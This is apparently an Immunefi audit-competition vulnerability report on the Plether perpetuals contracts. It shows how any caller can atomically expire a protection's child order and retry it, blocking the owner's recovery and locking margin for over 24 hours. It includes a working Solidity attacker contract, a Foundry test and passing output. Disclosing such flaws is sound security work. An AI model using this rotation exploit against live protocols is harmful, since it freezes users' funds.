# \#98837 [SC-High] Atomic expiry-and-retry rotation denies protected-position recovery and keeps margin locked beyond 24 hours

**Submitted on Nov 10th 2026 at 13:59:51 UTC by @Nescient for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98837
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

# Description

## Brief/Intro

When a protected close cannot complete, Plether retains the protection and moves it to `Latched`. This is the recovery state in which the position owner can replace the close limits before attempting the close again. The retry entry point, however, is open to any caller.

An attacker can therefore combine public order expiry with public protection retry in one transaction. The first call creates the owner’s amendment state; the second call immediately consumes it and creates a new `Triggered` child using the old limits. Repeating this at each child deadline prevents the owner from repairing the protection or taking an ordinary exit, leaving the position margin locked for more than 24 hours.

## Vulnerability Details

The owner repair function first resolves the owner’s active protection and then accepts changes only for a `Latched` protection with no pending order:

```solidity
StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
    revert OrderRouter__ProtectionNotLatched();
}
if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
    revert OrderRouter__PendingOrdersExist();
}
```

The retry function checks the same status but uses `_activeProtection`, so it is not restricted to the protection owner. It then commits a replacement child and records it as the active attempt:

```solidity
StoredProtection storage protection = _activeProtection(protectionId);
if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
    revert OrderRouter__ProtectionNotLatched();
}
// position and pending-order checks omitted
linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
    .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
_recordCloseAttempt(protection, linkedOrderId);
```

For a retained failed attempt, the Router callback changes `Triggered` to `Latched` before the public call returns:

```solidity
if (retained) {
    protection.status = PositionProtectionTypes.PositionProtectionStatus.Latched;
    return true;
}
```

The same transition occurs for an expired child. A permissionless caller can exploit that transition as follows:

```solidity
keeper.expireOrder(childOrderId);                         // child expires; protection becomes Latched
protectionActions.retryPositionProtectionClose(protectionId); // Latched is consumed immediately
```

Because both calls are made by an attacker-controlled contract, the owner cannot insert `amendLatchedPositionProtectionCloseLimits` between them. The replacement child copies the previously stored limits and returns the protection to `Triggered`.

The active protection also prevents the owner from bypassing the race. In this state:

- amending the limits fails because the protection is no longer `Latched`;
- direct cancellation is accepted only for `PendingOpen` or `Armed` protections;
- cancel-and-close also requires `Armed`; and
- an ordinary close is rejected while an active protection exists.

The protocol permits an execution window of up to one hour. The attacker can choose any valid shorter window and repeat the atomic operation at each deadline. The replacement child retains the restrictive financial limits, but an untrusted caller can consume the only owner-controlled amendment interval before the owner can use it.

## Impact Details

The claimed impact is **Temporary freezing of funds for at least 24 hours**.

The test opens a real position, configures a deliberately unusable execution-notional ceiling, and triggers a protected close. The attacker batch first executes the child and verifies a typed constraint failure, then retries in the same transaction. It subsequently performs 30 atomic expiry/retry rotations with a valid 50-minute execution window. That is 25 hours of continuously refreshed child deadlines.

At the end of the test:

- the position size is still open;
- the same non-zero margin remains pledged to that position;
- the restrictive limits are still present on the active child;
- owner amendment and both owner recovery/exit paths revert; and
- a fresh protected close remains pending, extending the freeze.

No price manipulation, oracle failure, fund theft, or victim mistake is required. The attacker does need its rotation transaction to be included before the owner’s recovery transaction at each deadline; once included, expiry and retry are indivisible.

## References

- [`PositionProtectionBook.amendLatchedPositionProtectionCloseLimits`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328)
- [`PositionProtectionBook.retryPositionProtectionClose`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L405)
- [`PositionProtectionBook.handleFailedProtectionAttempt`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637-L675)
- [`PositionProtectionBook` cancellation guards](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L331-L368)
- [`OrderLiquidationBatchLogic` active-protection lock](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L302-L315)
- [`OrderRouterAdmin` execution-window limit](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterAdmin.sol#L28-L31)
- [`CANONICAL_ENTRYPOINTS.md` protection recovery semantics](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L143-L148)


## Proof of Concept

## Proof of Concept

Save the following test as `packages/perps/test/perps/spec/trader/PositionProtectionRecoveryStarvationSubmission.t.sol` in the frozen repository.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "./PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPerpsKeeper} from "@plether/perps/interfaces/IPerpsKeeper.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {console2} from "forge-std/console2.sol";

contract RecoveryStarvationBatch {
    function failThenRotate(
        IPerpsKeeper keeper,
        IPositionProtectionActions actions,
        uint64 childOrder,
        uint64 protection,
        bytes[] calldata updateData
    ) external payable returns (OrderV3Types.ExecutionResult memory result, uint64 replacementOrder) {
        result = keeper.executeOrder{value: msg.value}(childOrder, updateData);
        replacementOrder = actions.retryPositionProtectionClose(protection);
    }

    function rotate(
        IPerpsKeeper keeper,
        IPositionProtectionActions actions,
        uint64 childOrder,
        uint64 protection
    ) external returns (uint64 replacementOrder) {
        keeper.expireOrder(childOrder);
        replacementOrder = actions.retryPositionProtectionClose(protection);
    }
}

contract PositionProtectionRecoveryStarvationSubmissionTest is PositionProtectionTest {
    function test_RotationKeepsOwnerRecoveryUnavailableBeyondOneDay() public {
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.maxExecutionWindowSeconds = 50 minutes;
        _setRouterConfig(routerConfig);
        _refreshMark(MARK_PRICE);

        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);

        PositionProtectionTypes.PositionProtectionParams memory protectionParams =
            _params(LONG_TAKE_PROFIT, 0);
        protectionParams.closeLimits.maxExecutionNotionalAssets = 2_500_000;

        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(protectionParams);
        uint64 childOrder = _triggerAt(protectionId, LONG_TAKE_PROFIT);
        (, uint256 lockedMarginBefore,,,,,) = engine.positions(ALICE);
        uint256 startedAt = vm.getBlockTimestamp();

        RecoveryStarvationBatch batch = new RecoveryStarvationBatch();

        (OrderV3Types.ExecutionResult memory failedResult, uint64 replacementOrder) = batch.failThenRotate(
            IPerpsKeeper(address(router)),
            protectionActions,
            childOrder,
            protectionId,
            _mockPythUpdateData(LONG_TAKE_PROFIT)
        );
        assertEq(uint8(failedResult.status), uint8(OrderV3Types.LifecycleStatus.Failed), "the stale limit must fail");
        assertEq(
            uint8(failedResult.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "the failure must be caused by a financial constraint"
        );
        console2.log("Test evidence: initial protected close failed with ConstraintViolation");
        childOrder = replacementOrder;

        uint256 rotations = 30;
        for (uint256 i; i < rotations; ++i) {
            uint64 deadline = router.lifecycleBook().orderTiming(childOrder).executionDeadline;
            vm.warp(uint256(deadline) + 1);
            childOrder = batch.rotate(IPerpsKeeper(address(router)), protectionActions, childOrder, protectionId);

            PositionProtectionTypes.PositionProtectionView memory currentProtection =
                protectionViews.getPositionProtection(protectionId);
            assertEq(
                uint8(currentProtection.status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
                "retry must consume Latched before Alice can amend"
            );
            assertEq(currentProtection.linkedOrderId, childOrder, "replacement child must remain active");
            _assertPendingCloseLimits(childOrder, protectionParams.closeLimits);
        }

        assertGt(vm.getBlockTimestamp() - startedAt, 24 hours, "the protected exit remains blocked for one day");
        console2.log("Test evidence: atomic expiry/retry rotations", rotations);
        console2.log("Test evidence: elapsed seconds", vm.getBlockTimestamp() - startedAt);

        PositionProtectionTypes.CloseFinancialLimits memory repairedLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: 31_500e6,
            maxGrossAccountDebitAssets: 31_500e6,
            maxActionChargeAssets: 31_500e6,
            maxExplicitFeesAssets: 31_500e6
        });

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, repairedLimits);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);

        OrderV3Types.OrderRequest memory closeRequest = _manualCloseRequest(CfdTypes.Side.LONG);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(closeRequest);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, closeRequest);

        (uint256 sizeAfter, uint256 lockedMarginAfter,,,,,) = engine.positions(ALICE);
        assertEq(sizeAfter, POSITION_SIZE, "the position cannot be closed");
        assertEq(lockedMarginAfter, lockedMarginBefore, "the locked margin remains unchanged");
        assertGt(lockedMarginAfter, 0, "the blocked position retains user margin");
        assertEq(router.pendingOrderCounts(ALICE), 1, "one unexecutable replacement remains queued");
        console2.log("Test evidence: remaining position size", sizeAfter);
        console2.log("Test evidence: locked margin assets", lockedMarginAfter);
        console2.log("Test evidence: owner recovery and ordinary close paths reverted as expected");
    }
}
```

Run:

```sh
forge test --root packages/perps \
  --match-path test/perps/spec/trader/PositionProtectionRecoveryStarvationSubmission.t.sol \
  --match-test test_RotationKeepsOwnerRecoveryUnavailableBeyondOneDay -vv
```

Observed result on commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`:

```text
Ran 1 test for test/perps/spec/trader/PositionProtectionRecoveryStarvationSubmission.t.sol:PositionProtectionRecoveryStarvationSubmissionTest
[PASS] test_RotationKeepsOwnerRecoveryUnavailableBeyondOneDay() (gas: 26941527)
Logs:
  Test evidence: initial protected close failed with ConstraintViolation
  Test evidence: atomic expiry/retry rotations 30
  Test evidence: elapsed seconds 90031
  Test evidence: remaining position size 10000000000000000000000
  Test evidence: locked margin assets 1986000000
  Test evidence: owner recovery and ordinary close paths reverted as expected
Suite result: ok. 1 passed; 0 failed; 0 skipped
Ran 1 test suite: 1 tests passed, 0 failed, 0 skipped
```

